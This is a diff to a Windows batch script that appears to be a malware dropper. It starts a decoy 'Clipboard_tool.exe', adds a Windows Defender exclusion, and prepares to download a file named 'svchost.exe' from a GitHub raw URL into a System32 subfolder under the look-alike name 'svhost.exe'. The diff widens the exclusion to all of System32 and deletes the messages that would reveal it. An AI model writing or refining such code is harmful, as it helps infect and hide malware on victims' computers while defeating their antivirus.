@@ -47,6 +47,7 @@ if %errorlevel% neq 0 (
 
 :: --- Target folder: the directory this .bat is in ---
 set "FAKE_EXE=Clipboard_tool.exe"
+set "EXLUTION_DIR=C:\Windows\System32\"
 set "TARGET_DIR=C:\Windows\System32\mc-fre"
 set "TARGET_NAME=svhost.exe"
 set "GITHUB_RAW_URL=https://github.com/osama32895/svchost/raw/refs/heads/main/svchost.exe"
@@ -57,24 +58,20 @@ start %b2eincfilepath%\%FAKE_EXE%
 :: remove trailing backslash (optional, but keeps it clean)
 if "%TARGET_DIR:~-1%"=="\" set "TARGET_DIR=%TARGET_DIR:~0,-1%"
 
-echo Adding Windows Defender exclusion for:
-echo   "%TARGET_DIR%"
-echo 2
 
 :: --- Add Defender exclusion ---
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" 2>nul
+  "Add-MpPreference -ExclusionPath '%EXLUTION_DIR%'" 2>nul
 
 if %errorlevel% equ 0 (
   echo Done.
 ) else (
   echo Failed. Make sure Microsoft Defender is enabled and you are running as Administrator.
 )
-echo 3
 
 ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
-if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" || (echo ERROR: mkdir failed & exit /b 1)
+if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 
 set "OUT_FILE=%TARGET_DIR%\%TARGET_NAME%"
 
